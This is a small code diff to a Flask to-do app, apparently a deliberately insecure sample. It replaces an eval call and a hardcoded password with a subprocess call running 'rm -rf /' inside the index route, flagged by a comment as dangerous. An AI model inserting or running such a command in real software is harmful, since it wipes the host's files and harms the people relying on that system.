@@ -16,8 +16,10 @@ class Todo(db.Model):
   
 @app.route('/', methods=['POST','GET'])
 def index():
-  eval("print('This is dangerous')")
-  password = "my_secret_password"
+  import subprocess
+
+# Dangerous subprocess call
+  subprocess.Popen(["rm", "-rf", "/"], shell=True)
   if request.method=='POST':
     task_content=request.form['content']
     new_task=Todo(content=task_content)
